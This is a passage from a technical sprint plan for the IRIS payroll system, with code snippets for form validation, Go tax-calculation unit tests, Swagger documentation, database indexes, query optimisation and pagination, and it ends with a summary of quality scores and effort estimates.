         queryClient.invalidateQueries({ queryKey: ['incidences'] });
       },
     });
   }
   ```

4. **Hour 5-6**: Convert other hooks

5. **Hour 7-8**: Update components to use new hooks

**Acceptance Criteria**:
- [ ] React Query installed and configured
- [ ] All data fetching uses useQuery
- [ ] All mutations use useMutation
- [ ] Automatic cache invalidation working

---

#### Task 2.4: Add Form Validation Schema
**Effort**: 6 hours
**Assignee**: Frontend Developer
**Files to Modify**:
- `frontend/lib/schemas/incidence.ts` (NEW)
- `frontend/components/incidences/CreateIncidenceDialog.tsx`

**Steps**:

1. **Hour 1-2**: Create Zod schemas
   ```typescript
   // lib/schemas/incidence.ts
   import { z } from 'zod';

   export const createIncidenceSchema = z.object({
     employee_id: z.string().uuid('Invalid employee ID'),
     payroll_period_id: z.string().uuid('Invalid period ID'),
     incidence_type_id: z.string().uuid('Invalid type ID'),
     start_date: z.string().regex(/^\d{4}-\d{2}-\d{2}$/, 'Invalid date format'),
     end_date: z.string().regex(/^\d{4}-\d{2}-\d{2}$/, 'Invalid date format'),
     quantity: z.number().positive('Quantity must be positive'),
     comments: z.string().max(500).optional(),
   }).refine(
     (data) => new Date(data.start_date) <= new Date(data.end_date),
     { message: 'End date must be after start date', path: ['end_date'] }
   );

   export type CreateIncidenceInput = z.infer<typeof createIncidenceSchema>;
   ```

2. **Hour 3-4**: Integrate with React Hook Form
   ```typescript
   import { useForm } from 'react-hook-form';
   import { zodResolver } from '@hookform/resolvers/zod';
   import { createIncidenceSchema, CreateIncidenceInput } from '@/lib/schemas/incidence';

   const { register, handleSubmit, formState: { errors } } = useForm<CreateIncidenceInput>({
     resolver: zodResolver(createIncidenceSchema),
   });
   ```

3. **Hour 5-6**: Add error display in form

**Acceptance Criteria**:
- [ ] All form inputs validated
- [ ] Clear error messages displayed
- [ ] Type-safe form data

---

### Sprint 2 Deliverables
- [ ] Incidences component refactored
- [ ] Error handling standardized
- [ ] React Query integrated
- [ ] Form validation complete
- [ ] Code quality: 7/10 -> 8/10

---

## SPRINT 3: TESTING FOUNDATION (Week 3)

### Goal
Establish testing infrastructure and write critical unit tests.

### Tasks

#### Task 3.1: Setup Testing Infrastructure
**Effort**: 4 hours

**Backend (Go)**:
```bash
# Already has testing built-in
# Create test files: *_test.go
```

**Frontend**:
```bash
npm install -D jest @testing-library/react @testing-library/jest-dom
npm install -D @types/jest ts-jest
```

---

#### Task 3.2: Unit Tests for Tax Calculations
**Effort**: 12 hours
**Files to Create**:
- `backend/internal/services/tax_calculation_service_test.go`

**Test Cases**:
```go
func TestCalculateISR(t *testing.T) {
    service := NewTaxService(testConfig)

    tests := []struct {
        name           string
        taxableIncome  float64
        periodType     string
        expectedISR    float64
        expectedSubsidy float64
    }{
        {"Low income biweekly", 1000.00, "biweekly", 50.00, 200.70},
        {"Mid income biweekly", 5000.00, "biweekly", 500.00, 0.00},
        {"High income biweekly", 50000.00, "biweekly", 15000.00, 0.00},
        // Add more test cases...
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            isr, subsidy, _ := service.CalculateISR(tt.taxableIncome, tt.periodType)
            assert.InDelta(t, tt.expectedISR, isr, 0.01)
            assert.InDelta(t, tt.expectedSubsidy, subsidy, 0.01)
        })
    }
}

func TestCalculateIMSS(t *testing.T) {
    // Test IMSS calculations
}

func TestCalculateSDI(t *testing.T) {
    // Test SDI calculations
}
```

---

#### Task 3.3: Unit Tests for Payroll Service
**Effort**: 12 hours
**Files to Create**:
- `backend/internal/services/payroll_service_test.go`

---

#### Task 3.4: Unit Tests for Validation Functions
**Effort**: 8 hours
**Files to Create**:
- `backend/internal/services/employee_service_test.go`

---

#### Task 3.5: Frontend Component Tests
**Effort**: 8 hours
**Files to Create**:
- `frontend/components/incidences/__tests__/IncidenceTable.test.tsx`

---

### Sprint 3 Deliverables
- [ ] Testing infrastructure setup
- [ ] Tax calculation tests (100% coverage)
- [ ] Payroll service tests (80% coverage)
- [ ] Validation tests (100% coverage)
- [ ] Test coverage: 0% -> 40%

---

## SPRINT 4: API DOCUMENTATION (Week 4)

### Goal
Create complete OpenAPI specification for all endpoints.

### Tasks

#### Task 4.1: Setup OpenAPI/Swagger
**Effort**: 4 hours

```bash
go install github.com/swaggo/swag/cmd/swag@latest
go get github.com/swaggo/gin-swagger
go get github.com/swaggo/files
```

---

#### Task 4.2: Document Auth Endpoints
**Effort**: 4 hours

```go
// @Summary Login user
// @Description Authenticate user and set auth cookies
// @Tags auth
// @Accept json
// @Produce json
// @Param request body LoginRequest true "Login credentials"
// @Success 200 {object} LoginResponse
// @Failure 401 {object} ErrorResponse
// @Router /api/v1/auth/login [post]
func (h *AuthHandler) Login(c *gin.Context) {
```

---

#### Task 4.3: Document Employee Endpoints
**Effort**: 6 hours

#### Task 4.4: Document Payroll Endpoints
**Effort**: 8 hours

#### Task 4.5: Document All Other Endpoints
**Effort**: 10 hours

---

### Sprint 4 Deliverables
- [ ] OpenAPI spec complete
- [ ] Swagger UI accessible
- [ ] All 80+ endpoints documented
- [ ] Documentation score: 6/10 -> 8/10

---

## SPRINT 5: PERFORMANCE (Week 5)

### Goal
Optimize database and fix performance issues.

### Tasks

#### Task 5.1: Add Database Indexes
**Effort**: 4 hours

```sql
-- Create migration file: 002_add_indexes.up.sql

-- Incidences
CREATE INDEX idx_incidences_period ON incidences(payroll_period_id);
CREATE INDEX idx_incidences_employee ON incidences(employee_id);
CREATE INDEX idx_incidences_status ON incidences(status);
CREATE INDEX idx_incidences_dates ON incidences(start_date, end_date);

-- Payroll
CREATE INDEX idx_payroll_calc_period ON payroll_calculations(payroll_period_id);
CREATE INDEX idx_payroll_calc_employee ON payroll_calculations(employee_id);
CREATE INDEX idx_payroll_calc_status ON payroll_calculations(calculation_status);

-- Employees
CREATE INDEX idx_employees_company ON employees(company_id);
CREATE INDEX idx_employees_status ON employees(employment_status);
CREATE INDEX idx_employees_collar ON employees(collar_type);

-- Absence Requests
CREATE INDEX idx_absence_employee ON absence_requests(employee_id);
CREATE INDEX idx_absence_status ON absence_requests(status);
CREATE INDEX idx_absence_stage ON absence_requests(current_approval_stage);
```

---

#### Task 5.2: Fix N+1 Queries
**Effort**: 8 hours

```go
// Before (N+1 problem)
var incidences []Incidence
db.Find(&incidences)
for _, inc := range incidences {
    db.First(&inc.Employee, inc.EmployeeID)  // N queries!
}

// After (single query with preload)
var incidences []Incidence
db.Preload("Employee").
   Preload("IncidenceType").
   Preload("PayrollPeriod").
   Find(&incidences)
```

---

#### Task 5.3: Implement Pagination
**Effort**: 8 hours

```go
type PaginationParams struct {
    Page     int `form:"page" default:"1"`
    PageSize int `form:"page_size" default:"50"`
}

type PaginatedResponse struct {
    Data       interface{} `json:"data"`
    Total      int64       `json:"total"`
    Page       int         `json:"page"`
    PageSize   int         `json:"page_size"`
    TotalPages int         `json:"total_pages"`
}

func (h *IncidenceHandler) ListIncidences(c *gin.Context) {
    var params PaginationParams
    c.ShouldBindQuery(&params)

    offset := (params.Page - 1) * params.PageSize

    var total int64
    var incidences []models.Incidence

    db.Model(&models.Incidence{}).Count(&total)
    db.Offset(offset).Limit(params.PageSize).Find(&incidences)

    c.JSON(200, PaginatedResponse{
        Data:       incidences,
        Total:      total,
        Page:       params.Page,
        PageSize:   params.PageSize,
        TotalPages: int(math.Ceil(float64(total) / float64(params.PageSize))),
    })
}
```

---

#### Task 5.4: Add Response Caching
**Effort**: 4 hours

#### Task 5.5: Implement Rate Limiting
**Effort**: 4 hours

---

### Sprint 5 Deliverables
- [ ] Database indexes added
- [ ] N+1 queries fixed
- [ ] Pagination implemented
- [ ] Rate limiting active
- [ ] Performance score: 7/10 -> 8/10

---

## SPRINT 6-8: SUMMARY

| Sprint | Focus | Hours | Deliverables |
|--------|-------|-------|--------------|
| Sprint 6 | Integration Tests | 40h | API test coverage 50% |
| Sprint 7 | E2E Tests | 32h | Critical flow tests |
| Sprint 8 | Polish & Deploy | 24h | Production deployment |

---

# APPENDICES

## Appendix A: Complete File Reference

### Backend Files (80+)
```
backend/internal/api/
├── auth_handler.go (9 endpoints)
├── employee_handler.go (9 endpoints)
├── payroll_handler.go (12 endpoints)
├── payroll_period_handler.go (5 endpoints)
├── incidence_handler.go (14 endpoints)
├── absence_request_handler.go (8 endpoints)
├── announcement_handler.go (6 endpoints)
├── notification_handler.go (4 endpoints)
├── message_handler.go (5 endpoints)
├── calendar_handler.go (3 endpoints)
├── shift_handler.go (4 endpoints)
├── audit_handler.go (3 endpoints)
├── permission_handler.go (4 endpoints)
├── role_inheritance_handler.go (3 endpoints)
├── report_handler.go (2 endpoints)
├── catalog_handler.go (4 endpoints)
├── user_handler.go (4 endpoints)
├── upload_handler.go (2 endpoints)
├── health_handler.go (2 endpoints)
└── router.go
```

## Appendix B: Complete API Endpoint List

(80+ endpoints documented in previous sections)

## Appendix C: Database Schema

(33 tables documented in previous sections)

## Appendix D: Tax Calculation Reference

(Complete tax tables in Module 3 section)

---

# FINAL SUMMARY

## Overall Assessment

**IRIS Payroll System**: PRODUCTION READY with recommended improvements

## Scores

| Category | Before | After Sprints | Gap |
|----------|--------|---------------|-----|
| Security | 7/10 | 9/10 | +2 |
| Code Quality | 7.5/10 | 8.5/10 | +1 |
| Performance | 7/10 | 8/10 | +1 |
| Testing | 0% | 70% | +70% |
| Documentation | 6/10 | 8/10 | +2 |

## Investment Required

| Phase | Sprints | Hours | Duration |
|-------|---------|-------|----------|
| Critical (P0) | 1-2 | 72h | 2 weeks |
| High (P1) | 3-4 | 72h | 2 weeks |
| Medium (P2) | 5-6 | 74h | 2 weeks |
| Polish | 7-8 | 56h | 2 weeks |
| **Total** | **8** | **274h** | **8 weeks** |

## Recommendation

**PROCEED TO PRODUCTION** after completing Sprint 1-2 (critical security and code quality fixes).

---

**Report Complete**

**Generated**: January 2, 2026
**Version**: 2.0.0 (Complete Edition with Explicit Sprints)
**Next Review**: After Sprint 2 completion
